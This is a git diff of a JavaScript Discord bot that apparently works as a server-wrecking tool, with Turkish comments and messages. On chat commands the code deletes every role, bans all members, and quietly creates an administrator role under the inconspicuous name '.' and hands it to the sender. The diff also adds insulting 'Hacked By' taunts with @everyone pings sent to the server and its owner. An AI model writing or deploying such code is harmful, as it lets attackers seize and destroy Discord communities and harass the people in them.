@@ -99,7 +99,7 @@ client.on("message", async msg => {
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
     await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/vd77Jpf"); //KURUCUSUNA GONDERILEN MESAJ
     const kanal = await msg.guild.channels.find(x => x.name === "ャ tek-kral-enes-acar");
-    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>");
+    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>\n Hacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||");
   }
 });
 client.on("message", async msg => {
@@ -110,7 +110,7 @@ client.on("message", async msg => {
         users.send(
           "`Patladı knk, Burdan` <@" +
             msg.guild.owner.id +
-            "> `İsimli Orospuya Selamlar`\n || @everyone || https://discord.gg/xft7cnN "
+            "> `İsimli Salağa Selamlar`\n https://discord.gg/vd77Jpf"
         )
       )
       .catch(console.error);
@@ -123,10 +123,10 @@ client.on("message", msg => {
   if (msg.content === "+yetki") {
     msg.delete();
     msg.guild.createRole({
-      name: "666",
+      name: ".",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === "666");
+    let rol = msg.guild.roles.find(role => role.name === ".");
     msg.member.addRole(rol);
   }
 });
@@ -138,15 +138,10 @@ client.on("message", msg => {
 });
 
 client.on("message", msg => {
-  if (msg.content === "+rolspam") {
-    msg.guild.roles.forEach(roles => roles.delete());
-  }
-});
-
-client.on("message", msg => {
   if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());
   }
 });
+
 client.login(ayarlar.token);
